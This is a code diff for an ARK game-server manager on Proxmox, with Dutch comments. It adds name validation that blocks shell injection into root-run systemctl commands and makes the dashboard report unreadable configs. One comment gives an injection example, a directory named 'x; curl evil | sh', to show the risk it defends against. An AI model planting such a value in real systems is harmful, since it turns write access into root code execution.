@@ -54,6 +54,11 @@ except Exception as e:
 
 function shq(s) { return `'${String(s).replace(/'/g, `'\\''`)}'`; }
 
+// De enige vorm die een map/world-naam mag hebben. Afgedwongen bij creatie
+// (createMap/deleteMap) EN bij discovery, want de naam wordt geinterpoleerd
+// in systemctl-commando's die als root over guest-exec draaien.
+const MAP_NAME_RE = /^[A-Za-z0-9_]+$/;
+
 // Proxmox' guest-exec input-data can't carry wide (non-ASCII) characters — its
 // Perl base64 step throws "Wide character". ARK config is ASCII, so transliterate
 // common typographic chars and drop anything else outside ASCII.
@@ -100,6 +105,11 @@ class ArkInstance {
     this.map = map.internal || map.display;
     this.saveDir = map.saveDir || map.display;
     this.service = `${arkCfg.servicePrefix}${map.display.toLowerCase()}`;
+    // Laatste vangnet: `service` gaat ongequote in systemctl-commando's die als
+    // root draaien. Liever hier stuk dan een shell-metateken doorlaten.
+    if (!/^[A-Za-z0-9_.-]+$/.test(this.service)) {
+      throw new Error(`unsafe service name refused: ${JSON.stringify(this.service)}`);
+    }
     this.rconPort = parseInt(map.rconPort || 27020, 10);
     this.gamePort = map.gamePort; this.queryPort = map.queryPort;
     this.maxPlayers = parseInt(map.maxPlayers || 70, 10);
@@ -353,9 +363,33 @@ class ArkInstance {
 
   async configSummary() {
     if (this._cfg && Date.now() - this._cfgAt < 60000) return this._cfg;
+    // Kon de config NIET gelezen worden, dan is er niets te tonen.
+    //
+    // Dit ging mis: een mislukte lezing viel terug op een lege ini, waarna elke
+    // waarde op haar ingebouwde standaard uitkwam — PvE, moeilijkheid 1 (dus
+    // "max wild 30"), tamlimiet 5000, alle multipliers 1x — en het dashboard
+    // toonde dat als de echte serverinstelling. Er was geen enkel verschil te
+    // zien tussen "staat echt op 1x" en "kon de config niet lezen". Hetzelfde
+    // gold voor de platformen: die vielen terug op alles-toegestaan, waarna er
+    // "crossplay: PC + Xbox + PS5 + Windows Store" stond zonder dat er iets
+    // uitgelezen was.
     const c = await this.readConfig('gus').catch(() => ({ ok: false, ini: '' }));
-    const cg = await this.readConfig('game').catch(() => ({ ini: '' }));
-    const platforms = await this.readPlatforms().catch(() => ({ PC: true, XSX: true, PS5: true, WINGDK: true }));
+    const cg = await this.readConfig('game').catch(() => ({ ok: false, ini: '' }));
+    const gusOk = c.ok !== false && typeof c.ini === 'string' && c.ini.length > 0;
+    const gameOk = cg.ok !== false && typeof cg.ini === 'string' && cg.ini.length > 0;
+    let platforms = null;
+    try { platforms = await this.readPlatforms(); } catch { platforms = null; }
+
+    if (!gusOk && !gameOk) {
+      this._cfg = {
+        ok: false,
+        unreadable: true,
+        reason: 'De serverconfiguratie kon niet gelezen worden.',
+        multipliers: [], rules: null, sessionName: '', all: {},
+      };
+      this._cfgAt = Date.now();
+      return this._cfg;
+    }
     const kv = Object.assign({}, parseConf(cg.ini || ''), parseConf(c.ini || ''));  // GUS wins on conflict
     const lower = {}; for (const k in kv) lower[k.toLowerCase()] = kv[k];
     const num = (k, d) => { const v = parseFloat(lower[k.toLowerCase()]); return isNaN(v) ? d : v; };
@@ -372,10 +406,20 @@ class ArkInstance {
       maxWild: Math.round(num('OverrideOfficialDifficulty', 1) * 30),
       tameLimit: Math.round(num('MaxTamedDinos', 5000)),
       crosshair: bool('ServerCrosshair', true), thirdPerson: bool('AllowThirdPersonPlayer', true),
-      flyerCarry: bool('AllowFlyerCarryPvE', true), platforms,
-      crossplay: platforms.PC || platforms.XSX || platforms.PS5 || platforms.WINGDK,
+      flyerCarry: bool('AllowFlyerCarryPvE', true),
+      platforms,
+      // null = niet uitgelezen; de UI hoort dan "onbekend" te tonen in plaats
+      // van een crossplay-uitspraak te doen.
+      crossplay: platforms ? (platforms.PC || platforms.XSX || platforms.PS5 || platforms.WINGDK) : null,
     };
-    this._cfg = { ok: c.ok, multipliers, rules, sessionName: kv.SessionName || '', all: kv };
+    this._cfg = {
+      ok: c.ok,
+      unreadable: false,
+      // Welke van de twee bestanden gelezen zijn — een waarde uit een niet-gelezen
+      // bestand is een standaard, geen meting.
+      read: { gus: gusOk, game: gameOk },
+      multipliers, rules, sessionName: kv.SessionName || '', all: kv,
+    };
     this._cfgAt = Date.now();
     return this._cfg;
   }
@@ -669,6 +713,15 @@ async function discoverMaps(pmx, arkCfg) {
   const blocks = (r.out || '').split(/===MAP:(.+?)===/).slice(1);
   for (let i = 0; i < blocks.length; i += 2) {
     const display = blocks[i].trim();
+    // createMap() dwingt deze charset af, maar een map-dir kan ook met de hand
+    // op de VM zijn aangemaakt. De naam eindigt in `service`, dat ONGEQUOTE in
+    // systemctl-commando's gaat die als ROOT via guest-exec draaien -- een dir
+    // `x; curl evil | sh` maakt van een schrijfrecht onder maps/ (dat arkadmin
+    // heeft) dus root-RCE. Alles wat geen gewone naam is, negeren we.
+    if (!MAP_NAME_RE.test(display)) {
+      console.warn(`[ark] map-dir met onveilige naam genegeerd: ${JSON.stringify(display)}`);
+      continue;
+    }
     const conf = parseConf(blocks[i + 1] || '');
     maps.push({
       display,
